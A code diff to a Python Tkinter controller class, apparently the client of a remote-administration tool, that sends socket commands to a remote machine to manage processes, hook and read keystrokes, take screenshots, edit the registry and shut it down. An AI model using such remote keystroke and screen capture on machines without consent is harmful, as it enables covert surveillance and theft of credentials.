@@ -33,13 +33,15 @@ class Controller():
         self._menu.resultLabel.config(text=ip)
         self._socket.connect(ip=ip)
 
-    # 1 yes
+    # Function 1 yes
     def manager_prc(self, event):
+        self._socket.send("process")
         self._manager_prc = mng.Manager(tk.Toplevel(self._root))
         # bindings...
         self._manager_prc.btn_kill.bind("<Button>", self.manager_prc_kill)
         self._manager_prc.btn_view.bind("<Button>", self.manager_prc_view)
         self._manager_prc.btn_start.bind("<Button>", self.manager_prc_start)
+        self._manager_prc.btn_start.bind("<Destroy>", self.exit_func)
         # run window
         self._manager_prc.mainloop()
 
@@ -60,18 +62,20 @@ class Controller():
         self._inputbox[1].mainloop()
 
     def manager_prc_view(self, event):
-        self._socket.send("process")
+        self._socket.send("process,view")
         data = self._socket.receive()
         self._manager_prc.view(data)
 
-    # 2 yes
+    # Function 2 yes
     def manager_app(self, event):
+        self._socket.send("application")
         self._manager_app = mng.Manager(
             tk.Toplevel(self._root), "application")
         # bindings...
         self._manager_app.btn_kill.bind("<Button>", self.manager_app_kill)
         self._manager_app.btn_view.bind("<Button>", self.manager_app_view)
         self._manager_app.btn_start.bind("<Button>", self.manager_app_start)
+        self._manager_app.btn_start.bind("<Destroy>", self.exit_func)
         # run window
         self._manager_app.mainloop()
 
@@ -92,7 +96,7 @@ class Controller():
         self._inputbox[3].mainloop()
 
     def manager_app_view(self, event):
-        self._socket.send("application")
+        self._socket.send("application,view")
         data = self._socket.receive()
         self._manager_app.view(data)
 
@@ -100,13 +104,15 @@ class Controller():
         target = self._inputbox[boxid].getvalue()
         self._socket.send(','.join([cmd, act, target]))
 
-    # 3 yes
+    # Function 3 yes
     def keystroke(self, event):
+        self._socket.send("keystroke")
         self._keystroke = ksk.Keystroke(tk.Toplevel(self._root))
         # bindings...
         self._keystroke.btn_hook.bind("<Button>", self.keystroke_hook)
         self._keystroke.btn_unhook.bind("<Button>", self.keystroke_unhook)
         self._keystroke.btn_print.bind("<Button>", self.keystroke_print)
+        self._keystroke.btn_start.bind("<Destroy>", self.exit_func)
         # self._keystroke.btn_clear.bind("<Button>", self.keystroke_clear)
         # run window
         self._keystroke.mainloop()
@@ -120,34 +126,38 @@ class Controller():
         data = self._socket.receive()
 
     def keystroke_print(self, event):
-        self._socket.send("keystroke")
+        self._socket.send("keystroke,print")
         data = self._socket.receive()
         self._keystroke.print_keystroke(data.decode("utf8"))
 
-    # 4 yes
+    # Function 4 yes
     def screenshot(self, event):
+        self._socket.send("screenshot")
         self._screenshot = ssh.Screenshot(tk.Toplevel(self._root))
         # bindings...
         self._screenshot.btn_snap.bind("<Button>", self.screenshot_snap)
         self._screenshot.btn_save.bind("<Button>", self.screenshot_save)
+        self._screenshot.btn_start.bind("<Destroy>", self.exit_func)
         self._screenshot.mainloop()
 
     def screenshot_snap(self, event):
         # send
-        self._socket.send("screenshot")
+        self._socket.send("screenshot,snap")
         data = self._socket.receive()
         self._screenshot.update_image(data)
 
     def screenshot_save(self, event):
         self._screenshot.save_image()
 
-    # 5 no
+    # Function 5 yes
     def registry(self, event):
+        self._socket.send("registry")
         self._registry = rgs.Registry(tk.Toplevel(self._root))
         # bindings...
         self._registry.btn_browse.bind("<Button>", self.registry_browse)
         self._registry.btn_sendcont.bind("<Button>", self.registry_sendcont)
         self._registry.btn_send.bind("<Button>", self.registry_send)
+        self._registry.btn_start.bind("<Destroy>", self.exit_func)
         self._registry.mainloop()
 
     def registry_browse(self, event):
@@ -179,12 +189,19 @@ class Controller():
         self._socket.send(
             ','.join(request))
 
-    # 6 yes
+    # Function 6 yes
     def shutdown(self, event):
         self._socket.send("shutdown")
         self._socket.shutdown()
 
+    def exit_func(self, event):
+        self._socket.send("exit")
+
     def exit_prog(self, event):
-        self._socket.send("quit")
-        self._socket.shutdown()
-        self._root.destroy
+        try:
+            self._socket.send("quit")
+            self._socket.shutdown()
+        except OSError:
+            pass
+        finally:
+            self._root.destroy()
